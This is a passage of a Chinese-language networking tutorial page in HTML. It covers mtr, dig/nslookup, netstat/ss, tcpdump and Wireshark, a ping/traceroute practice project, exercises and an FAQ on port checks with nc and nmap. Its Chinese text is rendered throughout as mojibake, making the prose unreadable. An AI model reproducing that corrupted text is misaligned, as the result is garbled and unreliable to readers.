class="hljs-number"> 100 </span>=  3%  172.16.0.1<br></code></pre></td></tr></table></figure><p><strong>Linux&#x2F;Unix mtr</strong>ï¼š</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs ldif">mtr = My TraceRoute<br><br>åŠŸèƒ½ï¼š<br><span class="hljs-literal">-</span> å®æ—¶æ›´æ–°çš„traceroute<br><span class="hljs-literal">-</span> æŒç»­ç›‘æ§æ¯ä¸€è·³<br><span class="hljs-literal">-</span> æ˜¾ç¤ºä¸¢åŒ…ç‡å’Œå»¶è¿Ÿç»Ÿè®¡<br><span class="hljs-literal">-</span> äº¤äº’å¼ç•Œé¢<br><br>ä½¿ç”¨ï¼š<br>$ mtr google.com<br><br>è¾“å‡ºï¼š<br>                             My traceroute  [v0.93]<br>MYCOMPUTER (192.168.1.100)                          2025-11-05T10:00:00+0000<br><span class="hljs-attribute">Keys</span>:  Help   Display mode   Restart statistics   Order of fields   quit<br>                                       Packets               Pings<br> Host                                Loss%   Snt   Last   Avg  Best  Wrst StDev<br> 1. 192.168.1.1                       0.0%   100    1.2   1.3   1.0   2.0   0.2<br> 2. 10.0.0.1                          2.0%   100    5.1   5.3   4.8   8.0   0.5<br> 3. 172.16.0.1                        5.0%   100   15.2  15.5  14.0  20.0   1.2<br> 4. 61.152.54.125                     0.0%   100   20.1  20.3  19.0  25.0   1.0<br> 5. google.com                        0.0%   100   50.2  50.5  49.0  55.0   1.5<br><br>å®ç”¨é€‰é¡¹ï¼š<br><span class="hljs-literal">-</span>r  <span class="hljs-comment"># æŠ¥å‘Šæ¨¡å¼ï¼ˆéäº¤äº’ï¼‰</span><br><span class="hljs-literal">-</span>c 100  <span class="hljs-comment"># å‘é€100ä¸ªåŒ…ååœæ­¢</span><br><span class="hljs-literal">-</span>n  <span class="hljs-comment"># ä¸è§£æä¸»æœºå</span><br><span class="hljs-literal">-</span>b  <span class="hljs-comment"># æ˜¾ç¤ºä¸»æœºåå’ŒIP</span><br><br>ç¤ºä¾‹ï¼š<br>mtr -r -c 50 google.com &gt; report.txt<br></code></pre></td></tr></table></figure><h3 id="5-2-nslookup-dig-host"><a href="#5-2-nslookup-dig-host" class="headerlink" title="5.2 nslookup &#x2F; dig &#x2F; host"></a>5.2 nslookup &#x2F; dig &#x2F; host</h3><p><strong>DNSè¯Šæ–­å·¥å…·</strong>ï¼š</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs ldif">nslookupï¼š<br><span class="hljs-literal">-</span> æŸ¥è¯¢DNSè®°å½•<br><span class="hljs-literal">-</span> è·¨å¹³å°<br><br>ä½¿ç”¨ï¼š<br>$ nslookup google.com<br><span class="hljs-attribute">Server</span>:8.8.8.8<br><span class="hljs-attribute">Address</span>:8.8.8.8<span class="hljs-comment">#53</span><br><br>Non-authoritative answer:<br><span class="hljs-attribute">Name</span>:google.com<br><span class="hljs-attribute">Address</span>: 142.250.185.14<br><br>digï¼š<br><span class="hljs-literal">-</span> æ›´å¼ºå¤§çš„DNSå·¥å…·<br><span class="hljs-literal">-</span> è¯¦ç»†è¾“å‡º<br><span class="hljs-literal">-</span> Linux/Unix<br><br>ä½¿ç”¨ï¼š<br>$ dig google.com<br><br>; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; google.com<br>;; ANSWER SECTION:<br>google.com.299INA142.250.185.14<br><br>hostï¼š<br><span class="hljs-literal">-</span> ç®€å•DNSæŸ¥è¯¢<br><span class="hljs-literal">-</span> å¿«é€ŸæŸ¥è¯¢<br><br>ä½¿ç”¨ï¼š<br>$ host google.com<br>google.com has address 142.250.185.14<br>google.com has IPv6 address 2607:f8b0:4005:80a::200e<br></code></pre></td></tr></table></figure><h3 id="5-3-netstat-ss"><a href="#5-3-netstat-ss" class="headerlink" title="5.3 netstat &#x2F; ss"></a>5.3 netstat &#x2F; ss</h3><p><strong>è¿æ¥çŠ¶æ€æŸ¥çœ‹</strong>ï¼š</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs ldif">netstatï¼ˆè€å·¥å…·ï¼‰ï¼š<br><span class="hljs-literal">-</span> æ˜¾ç¤ºç½‘ç»œè¿æ¥<br><span class="hljs-literal">-</span> æ˜¾ç¤ºè·¯ç”±è¡¨<br><span class="hljs-literal">-</span> æ˜¾ç¤ºæ¥å£ç»Ÿè®¡<br><br>å¸¸ç”¨é€‰é¡¹ï¼š<br><span class="hljs-literal">-</span>a  <span class="hljs-comment"># æ‰€æœ‰è¿æ¥</span><br><span class="hljs-literal">-</span>t  <span class="hljs-comment"># TCPè¿æ¥</span><br><span class="hljs-literal">-</span>u  <span class="hljs-comment"># UDPè¿æ¥</span><br><span class="hljs-literal">-</span>n  <span class="hljs-comment"># æ•°å­—æ ¼å¼ï¼ˆä¸è§£æï¼‰</span><br><span class="hljs-literal">-</span>p  <span class="hljs-comment"># æ˜¾ç¤ºè¿›ç¨‹</span><br><span class="hljs-literal">-</span>r  <span class="hljs-comment"># è·¯ç”±è¡¨</span><br><span class="hljs-literal">-</span>i  <span class="hljs-comment"># æ¥å£ç»Ÿè®¡</span><br><br>ç¤ºä¾‹ï¼š<br>netstat -antp  <span class="hljs-comment"># æ‰€æœ‰TCPè¿æ¥ï¼Œæ˜¾ç¤ºè¿›ç¨‹</span><br><br>ssï¼ˆæ–°å·¥å…·ï¼Œæ›´å¿«ï¼‰ï¼š<br><span class="hljs-literal">-</span> netstatçš„ç°ä»£æ›¿ä»£å“<br><span class="hljs-literal">-</span> æ›´å¿«ï¼ŒåŠŸèƒ½æ›´å¼º<br><br>å¸¸ç”¨é€‰é¡¹ï¼š<br><span class="hljs-literal">-</span>a  <span class="hljs-comment"># æ‰€æœ‰å¥—æ¥å­—</span><br><span class="hljs-literal">-</span>t  <span class="hljs-comment"># TCP</span><br><span class="hljs-literal">-</span>u  <span class="hljs-comment"># UDP</span><br><span class="hljs-literal">-</span>n  <span class="hljs-comment"># æ•°å­—æ ¼å¼</span><br><span class="hljs-literal">-</span>p  <span class="hljs-comment"># æ˜¾ç¤ºè¿›ç¨‹</span><br><span class="hljs-literal">-</span>l  <span class="hljs-comment"># ç›‘å¬å¥—æ¥å­—</span><br><br>ç¤ºä¾‹ï¼š<br>ss -antp  <span class="hljs-comment"># æ‰€æœ‰TCPè¿æ¥ï¼Œæ˜¾ç¤ºè¿›ç¨‹</span><br>ss -s  <span class="hljs-comment"># ç»Ÿè®¡æ‘˜è¦</span><br></code></pre></td></tr></table></figure><h3 id="5-4-tcpdump-wireshark"><a href="#5-4-tcpdump-wireshark" class="headerlink" title="5.4 tcpdump &#x2F; wireshark"></a>5.4 tcpdump &#x2F; wireshark</h3><p><strong>æŠ“åŒ…åˆ†æå·¥å…·</strong>ï¼š</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs ldif">tcpdumpï¼š<br><span class="hljs-literal">-</span> å‘½ä»¤è¡ŒæŠ“åŒ…å·¥å…·<br><span class="hljs-literal">-</span> å¼ºå¤§çš„è¿‡æ»¤å™¨<br><span class="hljs-literal">-</span> é€‚åˆæœåŠ¡å™¨<br><br>åŸºæœ¬ä½¿ç”¨ï¼š<br>tcpdump -i eth0  <span class="hljs-comment"># æŠ“å–eth0æ¥å£</span><br>tcpdump icmp  <span class="hljs-comment"># åªæŠ“ICMPåŒ…</span><br>tcpdump host google.com  <span class="hljs-comment"># æŒ‡å®šä¸»æœº</span><br>tcpdump port 80  <span class="hljs-comment"># æŒ‡å®šç«¯å£</span><br><br>å¸¸ç”¨é€‰é¡¹ï¼š<br><span class="hljs-literal">-</span>i interface  <span class="hljs-comment"># æŒ‡å®šæ¥å£</span><br><span class="hljs-literal">-</span>c count  <span class="hljs-comment"># æŠ“å–æ•°é‡</span><br><span class="hljs-literal">-</span>w file  <span class="hljs-comment"># ä¿å­˜åˆ°æ–‡ä»¶</span><br><span class="hljs-literal">-</span>r file  <span class="hljs-comment"># è¯»å–æ–‡ä»¶</span><br><span class="hljs-literal">-</span>n  <span class="hljs-comment"># ä¸è§£æ</span><br><span class="hljs-literal">-</span>v  <span class="hljs-comment"># è¯¦ç»†è¾“å‡º</span><br><br>ç¤ºä¾‹ï¼š<br><span class="hljs-comment"># æŠ“å–pingåŒ…</span><br>tcpdump -i any icmp<br><br><span class="hljs-comment"># æŠ“å–åˆ°google.comçš„åŒ…å¹¶ä¿å­˜</span><br>tcpdump -i eth0 host google.com -w capture.pcap<br><br>Wiresharkï¼š<br><span class="hljs-literal">-</span> å›¾å½¢åŒ–æŠ“åŒ…å·¥å…·<br><span class="hljs-literal">-</span> åŠŸèƒ½å¼ºå¤§<br><span class="hljs-literal">-</span> è¯¦ç»†åˆ†æ<br><span class="hljs-literal">-</span> é€‚åˆæ¡Œé¢ä½¿ç”¨<br><br>ç‰¹ç‚¹ï¼š<br>âœ… ç›´è§‚çš„ç•Œé¢<br>âœ… å¼ºå¤§çš„è¿‡æ»¤<br>âœ… åè®®è§£æ<br>âœ… ç»Ÿè®¡åˆ†æ<br>âœ… æµè¿½è¸ª<br></code></pre></td></tr></table></figure><hr><h2 id="6-å®æˆ˜é¡¹ç›®ï¼šç½‘ç»œè¯Šæ–­å·¥å…·å¥—ä»¶"><a href="#6-å®æˆ˜é¡¹ç›®ï¼šç½‘ç»œè¯Šæ–­å·¥å…·å¥—ä»¶" class="headerlink" title="6. å®æˆ˜é¡¹ç›®ï¼šç½‘ç»œè¯Šæ–­å·¥å…·å¥—ä»¶"></a>6. å®æˆ˜é¡¹ç›®ï¼šç½‘ç»œè¯Šæ–­å·¥å…·å¥—ä»¶</h2><h3 id="6-1-é¡¹ç›®éœ€æ±‚"><a href="#6-1-é¡¹ç›®éœ€æ±‚" class="headerlink" title="6.1 é¡¹ç›®éœ€æ±‚"></a>6.1 é¡¹ç›®éœ€æ±‚</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs markdown">åŠŸèƒ½éœ€æ±‚ï¼š<br><span class="hljs-bullet">1.</span> å®ç°pingåŠŸèƒ½<br><span class="hljs-bullet">   -</span> ICMPå›æ˜¾è¯·æ±‚/åº”ç­”<br><span class="hljs-bullet">   -</span> RTTè®¡ç®—<br><span class="hljs-bullet">   -</span> ç»Ÿè®¡ä¿¡æ¯<br><br><span class="hljs-bullet">2.</span> å®ç°tracerouteåŠŸèƒ½<br><span class="hljs-bullet">   -</span> TTLé€’å¢<br><span class="hljs-bullet">   -</span> è·¯å¾„å‘ç°<br><span class="hljs-bullet">   -</span> å»¶è¿Ÿæµ‹é‡<br><br><span class="hljs-bullet">3.</span> ç½‘ç»œè´¨é‡æµ‹è¯•<br><span class="hljs-bullet">   -</span> ä¸¢åŒ…ç‡<br><span class="hljs-bullet">   -</span> å»¶è¿ŸæŠ–åŠ¨<br><span class="hljs-bullet">   -</span> æŒç»­ç›‘æ§<br><br><span class="hljs-bullet">4.</span> ç»¼åˆè¯Šæ–­æŠ¥å‘Š<br><span class="hljs-bullet">   -</span> è¿é€šæ€§æµ‹è¯•<br><span class="hljs-bullet">   -</span> è·¯å¾„åˆ†æ<br><span class="hljs-bullet">   -</span> æ€§èƒ½è¯„ä¼°<br><br>æŠ€æœ¯è¦æ±‚ï¼š<br><span class="hljs-bullet">-</span> Pythonå®ç°<br><span class="hljs-bullet">-</span> ä½¿ç”¨åŸå§‹å¥—æ¥å­—<br><span class="hljs-bullet">-</span> è·¨å¹³å°æ”¯æŒï¼ˆå°½é‡ï¼‰<br><span class="hljs-bullet">-</span> å‹å¥½çš„è¾“å‡º<br></code></pre></td></tr></table></figure><h3 id="6-2-å·¥å…·æ¼”ç¤º"><a href="#6-2-å·¥å…·æ¼”ç¤º" class="headerlink" title="6.2 å·¥å…·æ¼”ç¤º"></a>6.2 å·¥å…·æ¼”ç¤º</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># pingåŠŸèƒ½</span><br>python day24_network_diagnostic.py --ping google.com<br><br><span class="hljs-comment"># tracerouteåŠŸèƒ½</span><br><span class="hljs-built_in">sudo</span> python day24_network_diagnostic.py --traceroute google.com<br><br><span class="hljs-comment"># ç½‘ç»œè´¨é‡æµ‹è¯•</span><br>python day24_network_diagnostic.py --quality google.com --count 100<br><br><span class="hljs-comment"># ç»¼åˆè¯Šæ–­</span><br>python day24_network_diagnostic.py --diagnose google.com<br></code></pre></td></tr></table></figure><hr><h2 id="7-ä»Šæ—¥ç»ƒä¹ "><a href="#7-ä»Šæ—¥ç»ƒä¹ " class="headerlink" title="7. ä»Šæ—¥ç»ƒä¹ "></a>7. ä»Šæ—¥ç»ƒä¹ </h2><h3 id="ç»ƒä¹ 1ï¼špingåˆ†æ"><a href="#ç»ƒä¹ 1ï¼špingåˆ†æ" class="headerlink" title="ç»ƒä¹ 1ï¼špingåˆ†æ"></a>ç»ƒä¹ 1ï¼špingåˆ†æ</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> pingä¸€ä¸ªç½‘ç«™100æ¬¡ï¼Œè§‚å¯Ÿï¼š<br><span class="hljs-bullet">   -</span> å¹³å‡RTT<br><span class="hljs-bullet">   -</span> æœ€å¤§/æœ€å°RTT<br><span class="hljs-bullet">   -</span> ä¸¢åŒ…ç‡<br><span class="hljs-bullet">   -</span> RTTåˆ†å¸ƒ<br><br><span class="hljs-bullet">2.</span> pingæ—¶ä¿®æ”¹åŒ…å¤§å°ï¼š<br><span class="hljs-bullet">   -</span> æ­£å¸¸å¤§å°ï¼ˆ56å­—èŠ‚ï¼‰<br><span class="hljs-bullet">   -</span> MTUå¤§å°ï¼ˆ1472å­—èŠ‚ï¼‰<br><span class="hljs-bullet">   -</span> è¶…è¿‡MTUï¼ˆ2000å­—èŠ‚ï¼‰<br>   è§‚å¯Ÿæœ‰ä»€ä¹ˆä¸åŒï¼Ÿ<br><br><span class="hljs-bullet">3.</span> pingæ—¶ä¿®æ”¹TTLï¼š<br><span class="hljs-bullet">   -</span> TTL=1<br><span class="hljs-bullet">   -</span> TTL=5<br><span class="hljs-bullet">   -</span> TTL=64<br>   è§‚å¯Ÿç»“æœçš„åŒºåˆ«<br></code></pre></td></tr></table></figure><h3 id="ç»ƒä¹ 2ï¼štracerouteåˆ†æ"><a href="#ç»ƒä¹ 2ï¼štracerouteåˆ†æ" class="headerlink" title="ç»ƒä¹ 2ï¼štracerouteåˆ†æ"></a>ç»ƒä¹ 2ï¼štracerouteåˆ†æ</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> tracerouteåˆ°ä¸€ä¸ªå›½å¤–ç½‘ç«™ï¼š<br><span class="hljs-bullet">   -</span> è®°å½•æ€»è·³æ•°<br><span class="hljs-bullet">   -</span> æ‰¾å‡ºå»¶è¿Ÿæœ€å¤§çš„ä¸€è·³<br><span class="hljs-bullet">   -</span> åˆ†ææ˜¯å¦è·¨è¶Šé•¿è·ç¦»é“¾è·¯<br><br><span class="hljs-bullet">2.</span> å¯¹æ¯”ä¸åŒç›®æ ‡çš„è·¯å¾„ï¼š<br><span class="hljs-bullet">   -</span> å›½å†…ç½‘ç«™<br><span class="hljs-bullet">   -</span> é¦™æ¸¯ç½‘ç«™<br><span class="hljs-bullet">   -</span> ç¾å›½ç½‘ç«™<br>   åˆ†æè·¯ç”±å·®å¼‚<br><br><span class="hljs-bullet">3.</span> ä½¿ç”¨ä¸åŒæ–¹æ³•tracerouteï¼š<br><span class="hljs-bullet">   -</span> UDPæ–¹å¼<br><span class="hljs-bullet">   -</span> ICMPæ–¹å¼<br><span class="hljs-bullet">   -</span> TCPæ–¹å¼<br>   å¯¹æ¯”ç»“æœå·®å¼‚<br></code></pre></td></tr></table></figure><h3 id="ç»ƒä¹ 3ï¼šå®é™…æ•…éšœè¯Šæ–­"><a href="#ç»ƒä¹ 3ï¼šå®é™…æ•…éšœè¯Šæ–­" class="headerlink" title="ç»ƒä¹ 3ï¼šå®é™…æ•…éšœè¯Šæ–­"></a>ç»ƒä¹ 3ï¼šå®é™…æ•…éšœè¯Šæ–­</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs markdown">åœºæ™¯ï¼šç½‘ç«™è®¿é—®å¾ˆæ…¢<br><br>è¯Šæ–­æ­¥éª¤ï¼š<br><span class="hljs-bullet">1.</span> pingç½‘ç«™<br><span class="hljs-bullet">   -</span> èƒ½pingé€šå—ï¼Ÿ<br><span class="hljs-bullet">   -</span> RTTå¤šå°‘ï¼Ÿ<br><span class="hljs-bullet">   -</span> æœ‰ä¸¢åŒ…å—ï¼Ÿ<br><br><span class="hljs-bullet">2.</span> traceroute<br><span class="hljs-bullet">   -</span> å“ªä¸€è·³å»¶è¿Ÿé«˜ï¼Ÿ<br><span class="hljs-bullet">   -</span> æœ‰è¶…æ—¶çš„è·³å—ï¼Ÿ<br><br><span class="hljs-bullet">3.</span> nslookup<br><span class="hljs-bullet">   -</span> DNSè§£ææ­£å¸¸å—ï¼Ÿ<br><span class="hljs-bullet">   -</span> è§£ææ—¶é—´å¤šé•¿ï¼Ÿ<br><br><span class="hljs-bullet">4.</span> ç»¼åˆåˆ†æï¼š<br><span class="hljs-bullet">   -</span> é—®é¢˜åœ¨å“ªï¼Ÿ<br><span class="hljs-bullet">   -</span> å¦‚ä½•è§£å†³ï¼Ÿ<br></code></pre></td></tr></table></figure><h3 id="ç»ƒä¹ 4ï¼šç¼–ç¨‹å®ç°"><a href="#ç»ƒä¹ 4ï¼šç¼–ç¨‹å®ç°" class="headerlink" title="ç»ƒä¹ 4ï¼šç¼–ç¨‹å®ç°"></a>ç»ƒä¹ 4ï¼šç¼–ç¨‹å®ç°</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs markdown">å®ç°ä¸€ä¸ªç®€å•çš„pingï¼š<br><span class="hljs-bullet">1.</span> æ„é€ ICMPå›æ˜¾è¯·æ±‚<br><span class="hljs-bullet">2.</span> å‘é€æ•°æ®åŒ…<br><span class="hljs-bullet">3.</span> æ¥æ”¶å“åº”<br><span class="hljs-bullet">4.</span> è®¡ç®—RTT<br><span class="hljs-bullet">5.</span> æ˜¾ç¤ºç»“æœ<br><br>æç¤ºï¼š<br><span class="hljs-bullet">-</span> ä½¿ç”¨socket.IPPROTO<span class="hljs-emphasis">_ICMP</span><br><span class="hljs-emphasis">- éœ€è¦rootæƒé™</span><br><span class="hljs-emphasis">- è®¡ç®—æ ¡éªŒå’Œ</span><br></code></pre></td></tr></table></figure><hr><h2 id="8-å¸¸è§é—®é¢˜"><a href="#8-å¸¸è§é—®é¢˜" class="headerlink" title="8. å¸¸è§é—®é¢˜"></a>8. å¸¸è§é—®é¢˜</h2><p><strong>Q1ï¼šä¸ºä»€ä¹ˆæœ‰äº›ç½‘ç«™pingä¸é€šä½†èƒ½è®¿é—®ï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>æœåŠ¡å™¨å¯èƒ½ç¦ç”¨äº†ICMPå“åº”</li><li>é˜²ç«å¢™è¿‡æ»¤ICMP</li><li>è¿™æ˜¯å®‰å…¨é…ç½®</li><li>å¯ä»¥å°è¯•TCP pingï¼ˆå¦‚httpingï¼‰</li></ul><p><strong>Q2ï¼štracerouteä¸­çš„ * * * æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>è¯¥è·³è·¯ç”±å™¨ä¸å“åº”ICMP</li><li>å¯èƒ½è¢«é…ç½®ä¸ºä¸å›å¤</li><li>æˆ–é˜²ç«å¢™è¿‡æ»¤</li><li>ä¸ä¸€å®šè¡¨ç¤ºæ•…éšœ</li></ul><p><strong>Q3ï¼šä¸ºä»€ä¹ˆpingçš„RTTæœ‰æ—¶çªç„¶å˜å¤§ï¼Ÿ</strong></p><p>Aï¼š<br>å¯èƒ½åŸå› ï¼š</p><ul><li>ç½‘ç»œæ‹¥å¡</li><li>è·¯ç”±å™¨è´Ÿè½½é«˜</li><li>é“¾è·¯è´¨é‡å·®</li><li>æ— çº¿ä¿¡å·å¼±</li><li>åå°ä¸‹è½½&#x2F;ä¸Šä¼ </li></ul><p><strong>Q4ï¼špingå’ŒHTTPè®¿é—®çš„å»¶è¿Ÿä¸ºä»€ä¹ˆä¸åŒï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>pingåªæµ‹ICMPå¾€è¿”ï¼ˆç½‘ç»œå±‚ï¼‰</li><li>HTTPåŒ…æ‹¬TCPæ¡æ‰‹+åº”ç”¨å¤„ç†ï¼ˆå¤šå±‚ï¼‰</li><li>HTTPå»¶è¿Ÿ â‰ˆ ping RTT + TCPæ¡æ‰‹ + æœåŠ¡å™¨å¤„ç†</li><li>é€šå¸¸HTTPå»¶è¿Ÿ &gt; ping RTT</li></ul><p><strong>Q5ï¼šå¦‚ä½•æµ‹è¯•åˆ°ç‰¹å®šç«¯å£çš„è¿é€šæ€§ï¼Ÿ</strong></p><p>Aï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ä½¿ç”¨telnet</span><br>telnet google.com 80<br><br><span class="hljs-comment"># ä½¿ç”¨ncï¼ˆnetcatï¼‰</span><br>nc -zv google.com 80<br><br><span class="hljs-comment"># ä½¿ç”¨nmap</span><br>nmap -p 80 google.com<br><br><span class="hljs-comment"># TCP traceroute</span><br><span class="hljs-built_in">sudo</span> traceroute -T -p 80 google.com<br></code></pre></td></tr></table></figure><hr><h2 id="9-æ€»ç»“"><a href="#9-æ€»ç»“" class="headerlink" title="9. æ€»ç»“"></a>9. æ€»ç»“</h2><p>ä»Šå¤©æˆ‘ä»¬å­¦ä¹ äº†ï¼š</p><h3 id="æ ¸å¿ƒçŸ¥è¯†ç‚¹"><a href="#æ ¸å¿ƒçŸ¥è¯†ç‚¹" class="headerlink" title="æ ¸å¿ƒçŸ¥è¯†ç‚¹"></a>æ ¸å¿ƒçŸ¥è¯†ç‚¹</h3><ol><li><p><strong>ICMPåè®®</strong>ï¼š</p><ul><li>ç½‘ç»œå±‚è¾…åŠ©åè®®</li><li>é”™è¯¯æŠ¥å‘Šå’Œè¯Šæ–­</li><li>ä¸»è¦ç±»å‹å’Œæ ¼å¼</li></ul></li><li><p><strong>pingå·¥ä½œåŸç†</strong>ï¼š</p><ul><li>ICMPå›æ˜¾è¯·æ±‚&#x2F;åº”ç­”</li><li>RTTè®¡ç®—</li><li>ä¸¢åŒ…æ£€æµ‹</li></ul></li><li><p><strong>tracerouteåŸç†</strong>ï¼š</p><ul><li>åˆ©ç”¨TTLé€’å‡</li><li>è·¯å¾„å‘ç°</li><li>UDP&#x2F;ICMP&#x2F;TCPæ–¹å¼</li></ul></li><li><p><strong>ICMPv6</strong>ï¼š</p><ul><li>åŠŸèƒ½æ›´å¼ºå¤§</li><li>æ•´åˆNDPå’ŒMLD</li><li>é‚»å±…å‘ç°åè®®</li></ul></li><li><p><strong>è¯Šæ–­å·¥å…·</strong>ï¼š</p><ul><li>ping&#x2F;ping6</li><li>traceroute&#x2F;traceroute6</li><li>mtr&#x2F;pathping</li><li>netstat&#x2F;ss</li><li>tcpdump&#x2F;wireshark</li></ul></li></ol><h3 id="é‡ç‚¹å›é¡¾"><a href="#é‡ç‚¹å›é¡¾" class="headerlink" title="é‡ç‚¹å›é¡¾"></a>é‡ç‚¹å›é¡¾</h3><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs dos">ICMPæŠ¥æ–‡ç»“æ„ï¼š<br>- <span 